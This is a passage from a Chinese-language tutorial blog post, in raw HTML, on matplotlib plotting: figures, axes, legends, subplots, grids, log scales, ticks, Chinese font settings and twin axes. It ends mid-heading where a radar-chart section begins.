提供了matplotlib.figure图形类模块，它包含了创建图形对象的方法。通过调用 pyplot 模块中 figure() 函数来实例化 figure 对象。如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token comment">#创建图形对象</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/5.png"></p><p>下面使用 figure() 创建一个空白画布：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token comment">#创建图形对象</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>我们使用 add_axes<span class="token punctuation">(</span><span class="token punctuation">)</span> 将 axes 轴域添加到画布中。如下所示：ax<span class="token operator">=</span>fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># add_axes() 的参数值是一个序列，序列中的 4 个数字分别对应图形的左侧，底部，宽度，和高度，且每个数字必须介于 0 到 1 之间。设置 x 和 y 轴的标签以及标题，如下所示：</span>ax<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"sine wave"</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">'angle'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'sine'</span><span class="token punctuation">)</span>调用 axes 对象的 plot<span class="token punctuation">(</span><span class="token punctuation">)</span> 方法，对 x 、 y 数组进行绘图操作：ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Matplotlib-axes类使用详解"><a href="#Matplotlib-axes类使用详解" class="headerlink" title="Matplotlib axes类使用详解"></a>Matplotlib axes类使用详解</h2><p>Matplotlib 定义了一个 axes 类（轴域类），该类的对象被称为 axes 对象（即轴域对象），它指定了一个有数值范围限制的绘图区域。在一个给定的画布（figure）中可以包含多个 axes 对象，但是同一个 axes 对象只能在一个画布中使用。<br>2D 绘图区域（axes）包含两个轴（axis）对象；如果是 3D 绘图区域，则包含三个。<br>通过调用 add_axes() 方法能够将 axes 对象添加到画布中，该方法用来生成一个 axes 轴域对象，对象的位置由参数rect决定。<br>rect 是位置参数，接受一个由 4 个元素组成的浮点数列表，形如 [left, bottom, width, height] ，它表示添加到画布中的矩形区域的左下角坐标(x, y)，以及宽度和高度。如下所示：<br>ax=fig.add_axes([0.1,0.1,0.8,0.8])<br>注意：每个元素的值是画布宽度和高度的分数。即将画布的宽、高作为 1 个单位。比如，[ 0.1, 0.1, 0.8, 0.8]，它代表着从画布 10% 的位置开始绘制, 宽高是画布的 80%</p><h3 id="legend-绘制图例"><a href="#legend-绘制图例" class="headerlink" title="legend()绘制图例"></a>legend()绘制图例</h3><p>axes 类的 legend() 方法负责绘制画布中的图例，它需要三个参数，如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ax<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>handles<span class="token punctuation">,</span> labels<span class="token punctuation">,</span> loc<span class="token punctuation">)</span>labels 是一个字符串序列，用来指定标签的名称；loc 是指定图例位置的参数，其参数值可以用字符串或整数来表示；handles 参数，它也是一个序列，它包含了所有线型的实例；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/loc%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png" alt="loc的表示方法"></p><p>**axes.plot()**这是 axes 类的基本方法，它将一个数组的值与另一个数组的值绘制成线或标记，plot() 方法具有可选格式的字符串参数，用来指定线型、标记颜色、样式以及大小。</p><h3 id="Matplotlib-subplot-函数用法详解"><a href="#Matplotlib-subplot-函数用法详解" class="headerlink" title="Matplotlib subplot()函数用法详解"></a>Matplotlib subplot()函数用法详解</h3><p>在使用 Matplotlib 绘图时，我们大多数情况下，需要将一张画布划分为若干个子区域，之后，我们就可以在这些区域上绘制不用的图形。在本节，我们将学习如何在同一画布上绘制多个子图。<br>matplotlib.pyplot模块提供了一个 subplot() 函数，它可以均等地划分画布，该函数的参数格式如下：<br>plt.subplot(nrows, ncols, index)<br>nrows 与 ncols 表示要划分几行几列的子区域（nrows*nclos表示子图数量），index 的初始值为1，用来选定具体的某个子区域。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#如果新建的子图与现有的子图重叠，那么重叠部分的子图将会被自动删除，因为它们不可以共享绘图区域。</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#现在创建一个子图，它表示一个有2行1列的网格的顶部图。</span><span class="token comment">#因为这个子图将与第一个重叠，所以之前创建的图将被删除</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">211</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#创建带有黄色背景的第二个子图</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">,</span> facecolor<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/6.png"></p><p>如果不想覆盖之前的图，需要使用 add_subplot() 函数，代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltfig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>ax1 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span>ax1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ax2 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">221</span><span class="token punctuation">,</span> facecolor<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过给画布添加 axes 对象可以实现在同一画布中插入另外的图像</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> mathx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>pi<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0.05</span><span class="token punctuation">)</span>fig<span class="token operator">=</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>axes1 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># main axes</span>axes2 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.55</span><span class="token punctuation">,</span> <span class="token number">0.55</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># inset axes</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span>axes1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>axes1<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'sine'</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"cosine"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Matplotlib-subplot2grid-函数详解"><a href="#Matplotlib-subplot2grid-函数详解" class="headerlink" title="Matplotlib subplot2grid()函数详解"></a>Matplotlib subplot2grid()函数详解</h3><p> matplotlib.pyplot 模块提供了 subplot2grid() ，该函数能够在画布的特定位置创建 axes 对象（即绘图区域）。不仅如此，它还可以使用不同数量的行、列来创建跨度不同的绘图区域。与 subplot() 和 subplots() 函数不同，subplot2gird() 函数以非等分的形式对画布进行切分，并按照绘图区域的大小来展示最终绘图结果。函数语法格式如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>subplot2grid<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> location<span class="token punctuation">,</span> rowspan<span class="token punctuation">,</span> colspan<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>shape：把该参数值规定的网格区域作为绘图区域；<br>location：在给定的位置绘制图形，初始位置 (0,0) 表示第1行第1列；<br>rowsapan/colspan：这两个参数用来设置让子区跨越几行几列。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#使用 colspan指定列，使用rowspan指定行</span>a1 <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplot2grid<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>colspan <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span>a2 <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplot2grid<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rowspan <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span>a3 <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplot2grid<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rowspan <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> colspan <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>a2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token operator">*</span>x<span class="token punctuation">)</span>a2<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'square'</span><span class="token punctuation">)</span>a1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>a1<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'exp'</span><span class="token punctuation">)</span>a3<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>a3<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>tight_layout<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/7.png"></p><h2 id="Matplotlib-坐标格式"><a href="#Matplotlib-坐标格式" class="headerlink" title="Matplotlib 坐标格式"></a>Matplotlib 坐标格式</h2><p>​       通过 Matplotlib axes 对象提供的 grid() 方法可以开启或者关闭画布中的网格（即是否显示网格）以及网格的主/次刻度。除此之外，grid() 函数还可以设置网格的颜色、线型以及线宽等属性。</p><h3 id="Matplotlib-grid-设置网格格式"><a href="#Matplotlib-grid-设置网格格式" class="headerlink" title="Matplotlib grid()设置网格格式"></a>Matplotlib grid()设置网格格式</h3><p> grid() 的函数使用格式如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">grid<span class="token punctuation">(</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span> ls <span class="token operator">=</span> <span class="token string">'-.'</span><span class="token punctuation">,</span> lw <span class="token operator">=</span> <span class="token number">0.25</span><span class="token punctuation">)</span><span class="token comment">#color：表示网格线的颜色；</span><span class="token comment">#ls：表示网格线的样式；</span><span class="token comment">#lw：表示网格线的宽度；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>网格在默认状态下是关闭的，通过调用上述函数，网格会被自动开启，如果您只是想开启不带任何样式的网格，可以通过 grid(True) 来实现。</p><h3 id="Matplotlib坐标轴格式"><a href="#Matplotlib坐标轴格式" class="headerlink" title="Matplotlib坐标轴格式"></a>Matplotlib坐标轴格式</h3><p>在一个函数图像中，有时自变量 x 与因变量 y 是指数对应关系，这时需要将坐标轴刻度设置为对数刻度。Matplotlib 通过 axes 对象的xscale或yscale属性来实现对坐标轴的格式设置。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npfig<span class="token punctuation">,</span> axes <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span> x<span class="token punctuation">,</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>x<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Normal scale"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot <span class="token punctuation">(</span>x<span class="token punctuation">,</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#设置y轴</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_yscale<span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Logarithmic scale (y)"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"x axis"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"y axis"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>xaxis<span class="token punctuation">.</span>labelpad <span class="token operator">=</span> <span class="token number">10</span><span class="token comment">#设置x、y轴标签</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"x axis"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"y axis"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Matplotlib坐标轴范围"><a href="#Matplotlib坐标轴范围" class="headerlink" title="Matplotlib坐标轴范围"></a>Matplotlib坐标轴范围</h3><p>Matplotlib 可以根据自变量与因变量的取值范围，自动设置 x 轴与 y 轴的数值大小。当然，您也可以用自定义的方式，通过 set_xlim() 和 set_ylim() 对 x、y 轴的数值范围进行设置。当对 3D 图像进行设置的时，会增加一个 z 轴，此时使用 set_zlim() 可以对 z 轴进行设置。</p><h3 id="Matplotlib刻度和刻度标签"><a href="#Matplotlib刻度和刻度标签" class="headerlink" title="Matplotlib刻度和刻度标签"></a>Matplotlib刻度和刻度标签</h3><p>刻度指的是轴上数据点的标记，Matplotlib 能够自动的在 x 、y 轴上绘制出刻度。这一功能的实现得益于 Matplotlib 内置的刻度定位器和格式化器（两个内建类）。在大多数情况下，这两个内建类完全能够满足我们的绘图需求，但是在某些情况下，刻度标签或刻度也需要满足特定的要求，比如将刻度设置为“英文数字形式”或者“大写阿拉伯数字”，此时就需要对它们重新设置。<br>xticks()和yticks()函数接受一个列表对象作为参数，列表中的元素表示对应数轴上要显示的刻度ax.set_xticks([2,4,6,8,10])</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> mathx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>pi<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0.05</span><span class="token punctuation">)</span><span class="token comment">#生成画布对象</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#添加绘图区域</span>ax <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span>ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token comment">#设置x轴标签</span>ax<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span>‘angle’<span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'sine'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#设置x轴刻度标签</span>ax<span class="token punctuation">.</span>set_xticklabels<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'zero'</span><span class="token punctuation">,</span><span class="token string">'two'</span><span class="token punctuation">,</span><span class="token string">'four'</span><span class="token punctuation">,</span><span class="token string">'six'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#设置y轴刻度</span>ax<span class="token punctuation">.</span>set_yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Matplotlib中文乱码解决方案（两种方式）"><a href="#Matplotlib中文乱码解决方案（两种方式）" class="headerlink" title="Matplotlib中文乱码解决方案（两种方式）"></a>Matplotlib中文乱码解决方案（两种方式）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Matplotlib 默认不支持中文字体，这因为 Matplotlib 只支持 ASCII 字符，但中文标注更加符合中国人的阅读习惯。因此，本节重点讲解如何在 Windows 环境下让 Matplotlib 显示中文。</span><span class="token comment">#Matplotlib中文乱码</span><span class="token comment">#当不对 Matplotlib 进行设置，而直接使用中文时，绘制的图像会出现中文乱码。下面是一个含有中文乱码的折线图：</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/8.png"></p><h4 id="重写配置文件"><a href="#重写配置文件" class="headerlink" title="重写配置文件"></a>重写配置文件</h4><p>通过临时重写配置文件的方法，可以解决 Matplotlib 显示中文乱码的问题，代码如下所示：<br>import matplotlib.pyplot as plt<br>plt.rcParams[“font.sans-serif”]=[“SimHei”] #设置字体<br>plt.rcParams[“axes.unicode_minus”]=False #该语句解决图像中的“-”负号的乱码问题</p><h3 id="Matplotlib双轴图"><a href="#Matplotlib双轴图" class="headerlink" title="Matplotlib双轴图"></a>Matplotlib双轴图</h3><p>在一些应用场景中，有时需要绘制两个 x 轴或两个 y 轴，这样可以更直观地显现图像，从而获取更有效的数据。<code>Matplotlib</code>提供的 twinx() 和 twiny() 函数，除了可以实现绘制双轴的功能外，还可以使用不同的单位来绘制曲线，比如一个轴绘制对函数，另外一个轴绘制指数函数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment">#创建图形对象</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#添加子图区域</span>a1 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#准备数据</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token comment">#绘制指数函数</span>a1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>a1<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'exp'</span><span class="token punctuation">)</span><span class="token comment">#添加双轴</span>a2 <span class="token operator">=</span> a1<span class="token punctuation">.</span>twinx<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#‘ro’表示红色圆点</span>a2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'ro-'</span><span class="token punctuation">)</span><span class="token comment">#绘制对数函数</span>a2<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">)</span><span class="token comment">#绘制图例</span>fig<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>labels <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'exp'</span><span class="token punctuation">,</span><span class="token string">'log'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>loc<span class="token operator">=</span><span class="token string">'upper left'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/9.png"></p><h3 id="蜘蛛图"><a href="#蜘蛛图" class="headerlink" 